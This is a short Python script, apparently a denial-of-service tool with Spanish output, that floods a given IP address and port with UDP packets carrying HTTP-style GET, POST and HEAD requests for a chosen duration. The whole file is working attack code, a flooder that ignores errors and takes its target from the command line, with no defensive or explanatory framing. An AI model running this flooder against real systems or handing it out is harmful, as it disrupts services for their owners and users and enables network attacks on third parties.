#!/usr/bin/env python3
import socket
import random
import time
import sys

def udphttp_attack(target_ip, target_port, duration):
    print(f"[UDPHTTP] Atacando {target_ip}:{target_port} por {duration}s")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    
    http_requests = [
        f'GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n'.encode(),
        f'POST /login HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 100\r\n\r\n'.encode() + random._urandom(100),
        f'HEAD / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n'.encode(),
    ]
    
    while time.time() < end_time:
        try:
            for request in http_requests:
                sock.sendto(request, (target_ip, target_port))
        except:
            pass
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) == 4:
        udphttp_attack(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
